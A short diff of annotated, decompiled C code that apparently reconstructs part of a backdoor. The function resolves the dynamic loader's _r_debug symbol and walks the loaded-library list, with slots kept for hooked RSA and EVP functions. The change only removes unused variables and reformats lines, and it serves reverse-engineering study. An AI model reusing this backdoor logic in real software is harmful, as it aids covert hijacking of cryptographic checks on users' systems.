@@ -17,13 +17,6 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   Elf64_Sym *r_debug_symbol;
   uchar *r_debug_addr;
   backdoor_shared_libraries_data_t tmp_state;
-  Elf64_Sym *r_debug_sym;
-  uchar *debug_block;
-  void *orig_RSA_public_decrypt_slot;
-  void *orig_EVP_PKEY_set1_RSA_slot;
-  void *orig_RSA_get0_key_slot;
-  backdoor_hooks_data_t **orig_hooks_data_slot;
-  libc_imports_t *orig_libc_imports;
   
   // AutoDoc: Use the versioned `_r_debug` export so we never read the wrong struct layout.
   r_debug_symbol = elf_symbol_get(data->elf_handles->ldso,STR_r_debug,STR_GLIBC_2_2_5);
@@ -31,7 +24,7 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
   if (r_debug_symbol != (Elf64_Sym *)0x0) {
     tmp_state.elf_handles = data->elf_handles;
     // AutoDoc: Turn the symbol value into a runtime pointer before inspecting the version word and `r_map`.
-    r_debug_addr = tmp_state.elf_handles->ldso->elfbase->e_ident + r_debug_symbol->st_value;
+    r_debug_addr = (tmp_state.elf_handles)->ldso->elfbase->e_ident + r_debug_symbol->st_value;
     success = FALSE;
     // AutoDoc: Sanity-check `_r_debug.r_version` (expected 1) before dereferencing `r_map`.
     if (0 < *(int *)r_debug_addr) {
@@ -42,9 +35,7 @@ BOOL process_shared_libraries(backdoor_shared_libraries_data_t *data)
       tmp_state.hooks_data_slot = data->hooks_data_slot;
       tmp_state.libc_imports = data->libc_imports;
       // AutoDoc: Work on a stack scratch copy so the caller’s struct only updates when the scan succeeds.
-      success = process_shared_libraries_map
-                        (*(link_map **)(r_debug_addr + 8),&tmp_state
-                        );
+      success = process_shared_libraries_map(*(link_map **)(r_debug_addr + 8),&tmp_state);
       success = (BOOL)(success != FALSE);
     }
   }
